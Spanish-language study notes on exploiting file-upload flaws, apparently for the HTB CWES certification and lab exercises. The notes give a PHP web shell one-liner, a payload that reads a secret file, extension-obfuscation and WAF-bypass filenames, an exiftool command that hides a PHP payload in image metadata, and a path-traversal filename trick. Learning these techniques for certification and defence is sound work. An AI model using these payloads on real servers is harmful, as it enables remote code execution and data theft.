
Aquí solo añadiré lo que no mencionan en la certificacion CWES de HTB

```
<?php system($_GET['cmd']);?>
```

```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
## Cambio de cofiguración del server

Si hay algun archivo de configuración como `/etc/apache2/apache2.conf` y antes hubieramos conseguido alguna otra vulnerabilidad podríamos escribir en ese archvio que una extensión nieva se interprete como PHP y así inyectar la shell

## Obfuscating file extensions

```
exploit.pHp
exploit.php.jpg
exploit.php.
exploit%2Ephp
exploit.asp;.jpg
exploit.asp%00.jpg
```

Try using multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization. Sequences like `xC0 x2E`, `xC4 xAE` or `xC0 xAE` may be translated to `x2E` if the filename parsed as a UTF-8 string, but then converted to ASCII characters before being used in a path.


En otras ocasiones puede haber un WAF que elimine `.php` para bypassearlo utilizaremos :

```
exploit.p.phphp -> exploit.php
```

Como el WAF elimina el primer .php de esta forma al eliminarlo de igual forma quedaría .php como extensión


## Metadata

Si todo lo anterior no furula podríamos intentar hacer una imagen donde en la metadata haya un web shell que se ejecute más adelante

```
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
```

basicamente le mete la webshell en los metadatos y luego el output lo llama polyglot.php
## Uploading malicious client-side scripts

Si no podemos conseguir RCE podríamos hacer que en la imagen meter un `<script>` que haga un XSS -> si nos deja subir archivos HTML o imágenes SVG

Lo mismo para XXE pero con archivos .doc o .xls

## Uploading files using PUT

es un verb tampering con PUT

## LABS

Content-type restriction bypass
File upload via path traversal -> en el directorio donde aparece nuestra shell hay una protección para que no se ejecute asi que si ponemos en filename `..%2fexploit.php` se subira un directorio antes que no tiene restriccion
